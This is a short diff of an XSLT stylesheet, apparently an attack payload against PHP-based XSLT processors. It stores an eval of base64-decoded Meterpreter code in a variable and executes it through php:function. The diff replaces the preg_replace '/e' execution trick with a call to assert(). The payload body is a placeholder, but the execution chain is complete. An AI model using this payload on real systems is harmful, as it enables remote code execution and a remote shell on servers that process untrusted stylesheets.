@@ -3,6 +3,6 @@
                  <xsl:variable name="eval">
                          eval(base64_decode('Base64-encoded Meterpreter code'))
                  </xsl:variable>
-                 <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
+                 <xsl:variable name="preg" select="php:function('assert', $eval)"/>
          </xsl:template>
  </xsl:stylesheet>
